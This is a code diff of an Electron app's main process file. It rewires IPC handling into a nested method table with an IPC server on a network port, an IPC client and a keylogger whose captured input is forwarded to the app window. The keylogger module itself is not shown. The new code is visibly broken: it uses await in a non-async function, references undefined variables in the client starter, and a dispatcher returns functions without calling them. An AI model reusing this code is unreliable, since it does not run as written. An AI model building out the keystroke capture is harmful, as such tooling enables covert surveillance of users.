@@ -1,6 +1,7 @@
 const { app, BrowserWindow, ipcMain } = require('electron');
 const path = require('path');
-const Server = require('./src/modules/server');
+const Server = require('./src/modules/IPC/server');
+const Client = require('./src/modules/IPC/client');
 const KeyLogger = require('./src/modules/keylogger');
 
 // Handle creating/removing shortcuts on Windows when installing/uninstalling.
@@ -72,7 +73,9 @@ app.on('activate', () => {
 
 // In this file you can include the rest of your app's specific main process
 // code. You can also put them in separate files and import them here.
-let server, keyLogger;
+let server = {};
+let client = {};
+let keylogger;
 
 function sendMessageToMainWindow(message) {
 	if (!domHasLoaded)return "DOM HASN'T LOADED YET!";
@@ -84,39 +87,105 @@ function sendMessageToMainWindow(message) {
 
 ipcMain.handle("mainWindow", async (e, ...args) => {
 	var method = args[0];
+	var extraArgs = args[1];
 
-	if (typeof method != "string")return new Error("METHOD PARAMETER MUST BE OF STRING TYPE");
-	method = method.toLowerCase();
+	if (typeof method != "string")
+		return new Error("METHOD PARAMETER MUST BE OF STRING TYPE");
 
-	switch (method) {
-		case "startkeylog":
-			keyLogger = new KeyLogger(keyLoggerCallback);
-			return keyLogger.start();
-		case "stopkeylog":
-			return keyLogger.stop();
-		case "startserver":
-			server = new Server({id: "rinku_ipc_server", networkPort: 3101}, serverCallback);
-			return server.start();
-		case "stopserver":
-			return server.stop();
-		case "help":
-			return (
-				"Main Process Methods: \n\n" +
-				"startKeyLog => Start keylogger\n" +
-				"stopKeylog => Stop keylogger\n" +
-				"startServer => Start IPC server\n" +
-				"stopServer => Stop IPC server\n" +
-				"help => This help message\n\n" +
-				"All methods are case insensitive. Thank You!"
-			);
-		default:
-			return "Unknown Method. For all available methods: send the method \"help\"";
-	}
+	return await ipcMethods.exec(method);
 });
 
+const ipcMethods = {
+	IPC: {
+		server: {
+			start: function(serverId, options, callback) {
+				server.ipc = new Server(serverId, options, callback);
+				return server.ipc.start();
+			},
+			stop: function() {
+				return server.ipc.stop();
+			},
+			sendMessage: function(message) {
+				return server.ipc.emit(message);
+			}
+		},
+		client: {
+			start: function() {
+				client.ipc = new Client(serverId, clientId, options, callback);
+				return await client.ipc.connect();
+			},
+			disconnect: function() {
+				return client.ipc.disconnect();
+			},
+			sendMessage: function(message) {
+				return client.ipc.emit(message);
+			}
+		}
+	},
+	RPC: {
+		server: {
+
+		},
+		client: {
+
+		}
+	},
+	keyLogger: {
+		start: function() {
+			keylogger = new KeyLogger(keyLoggerCallback);
+			return keylogger.start();
+		},
+		stop: function() {
+			return keylogger.stop();
+		}
+	},
+	/**
+	 * Execute method. STRING SENSITIVE!!!
+	 * @param {string} methodstr Method to execute
+	 */
+	exec: async function(methodstr) {
+		const methods = methodstr.split(":");
+
+		var currentMethod = ipcMethods;
+		for (let i = 0; i < methods.length; i++) {
+			const method = methods[i];
+			if (currentMethod[method] === undefined)return "Unknown Method";
+			else if (typeof currentMethod[method] == "function")return await currentMethod[method];
+			currentMethod = currentMethod[method];
+		}
+	}
+}
+
+/**
+ * Start IPC server.
+ * @param {string} serverId ID of server.
+ * @param {number} port Port number. Defaults to 3100.
+ * @param {string} host Host name. Defaults to localhost.
+ * @param {object} extraOptions Extra options for ipc configuration.
+ * @param {function} callback Callback function.
+ */
+async function startServer(serverId, port, host, extraOptions, callback) {
+	if (!serverId.length || typeof serverId != "string")return new Error("INVALID SERVER ID PARAMETER");
+
+	port = port || 3100;
+	host = host || "localhost";
+	extraOptions = extraOptions || {};
+
+	// Check port availability
+	const portchecker = require('./src/modules/portchecker');
+	await portchecker(port, host);
+
+
+	server = new Server(serverId, {networkPort: port, ...extraOptions}, callback);
+	return server.start();
+}
+
 function serverCallback(...args) {
-	console.log(args);
+	sendMessageToMainWindow(args);
 }
 function keyLoggerCallback(...args) {
+	sendMessageToMainWindow(args);
+}
+function clientCallback(...args) {
 	sendMessageToMainWindow(args);
 }
